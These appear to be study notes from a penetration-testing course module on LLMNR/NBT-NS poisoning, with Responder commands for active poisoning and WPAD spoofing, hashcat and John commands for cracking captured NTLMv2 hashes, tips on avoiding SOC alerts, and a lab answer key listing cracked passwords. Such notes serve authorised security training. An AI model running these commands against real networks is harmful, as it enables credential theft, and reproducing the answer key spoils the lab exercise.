# LLMNR/NBT-NS Poisoning - from Linux — Notes

## What Are LLMNR & NBT-NS?

- **LLMNR (Link-Local Multicast Name Resolution):** Fallback name resolution when DNS fails. Uses **UDP 5355**. Broadcasts to all hosts on the local link.
- **NBT-NS (NetBIOS Name Service):** Second fallback if LLMNR also fails. Uses **UDP 137**. Identifies systems by NetBIOS name.
- **Key vulnerability:** ANY host on the network can reply to these broadcast requests — no authentication of the responder.

## Attack Flow

1. Victim mistypes a hostname (e.g., `\\printer01` instead of `\\print01`).
2. DNS has no record → returns "unknown host."
3. Victim broadcasts LLMNR/NBT-NS request to entire local network: "Who is `\\printer01`?"
4. Attacker (running Responder) replies: "That's me!"
5. Victim sends authentication request → attacker captures **NTLMv2 hash** (username + challenge-response).
6. Attacker cracks the hash offline or relays it (SMB Relay — separate technique).

## Tools

| Tool | Platform | Notes |
|------|----------|-------|
| **Responder** | Linux (Python) | Purpose-built for LLMNR/NBT-NS/MDNS poisoning. Most common choice. |
| **Inveigh** | Windows (C#/PowerShell) | Cross-platform MITM. Used when attacking from a Windows host. |
| **Metasploit** | Both | Built-in spoofing/poisoning modules. |

## Responder — Quick Reference

### Key Flags

```
-I <iface>    Network interface (required). Use 'ALL' for all interfaces.
-A            Analyze mode — passive listening only, no poisoning.
-w            Start WPAD rogue proxy (captures HTTP requests from IE with auto-detect).
-f            Fingerprint remote host OS/version.
-v            Verbose output.
-r            Answer netbios wredir suffix queries (may break things).
-d            Answer netbios domain suffix queries (may break things).
-F            Force NTLM/Basic auth on wpad.dat retrieval (may trigger login prompt).
-P            Force proxy authentication (effective with -r).
--lm          Force LM hashing downgrade (XP/2003 and earlier).
```

### Typical Usage

```bash
# Passive analysis (recon, no poisoning)
sudo responder -I ens224 -A

# Active poisoning (standard attack)
sudo responder -I ens224

# With WPAD proxy + fingerprinting
sudo responder -I ens224 -wf
```

### Required Ports

UDP 137, 138, 53 | UDP/TCP 389 | TCP 1433 | UDP 1434 | TCP 80, 135, 139, 445, 21, 3141, 25, 110, 587, 3128 | Multicast UDP 5355, 5353

### Log Locations

- **Per-host log files:** `/usr/share/responder/logs/`
- **Naming format:** `MODULE_NAME-HASH_TYPE-CLIENT_IP.txt`  
  Example: `SMB-NTLMv2-SSP-172.16.5.25.txt`
- Also stored in a **SQLite database** (configurable in `Responder.conf`).

## Cracking Captured Hashes

### Hashcat

```bash
# NTLMv2 = mode 5600
hashcat -m 5600 <hashfile> /usr/share/wordlists/rockyou.txt

# NTLMv1 = mode 5500
hashcat -m 5500 <hashfile> /usr/share/wordlists/rockyou.txt
```

### John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt <hashfile>
```

### Hash Identification

- Hashcat example hashes page: https://hashcat.net/wiki/doku.php?id=example_hashes
- Net-NTLMv2 format: `USER::DOMAIN:challenge:response:blob`

## Important Distinctions

| Hash Type | Can Crack Offline? | Can Pass-the-Hash? | Hashcat Mode |
|-----------|-------------------|-------------------|--------------|
| NTLMv2 (Net-NTLMv2) | Yes | **No** | 5600 |
| NTLMv1 (Net-NTLMv1) | Yes | **No** | 5500 |
| NT Hash (NTLM) | Yes | **Yes** | 1000 |

- Net-NTLMv2 hashes captured via Responder **cannot** be used for pass-the-hash — they must be cracked or relayed.
- SMB Relay is an alternative if SMB signing is not enforced (covered in Lateral Movement).

## Operational Tips

- Run Responder in a **tmux window** and let it collect hashes while doing other enumeration.
- Don't waste assessment time cracking hashes for low-value accounts — prioritize accounts that expand access.
- `-w` (WPAD) is highly effective in large orgs where IE auto-detect is enabled.
- Use `-A` (analyze) first during initial recon to understand traffic without disrupting the network.
- Be cautious with `-r`, `-d`, `-F`, `-P` — they can break things or trigger login prompts that alert users/SOC.

## Lab Answers

| #   | Question                         | Answer          |
| --- | -------------------------------- | --------------- |
| Q1  | Account starting with "b"        | `backupagent`   |
| Q2  | Cracked password for backupagent | `h1backup55`    |
| Q3  | Cracked password for wley        | `transporter@4` |


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[05-initial-domain-enum]] | [[07-llmnr-nbtns-poisoning-windows]] →
<!-- AUTO-LINKS-END -->
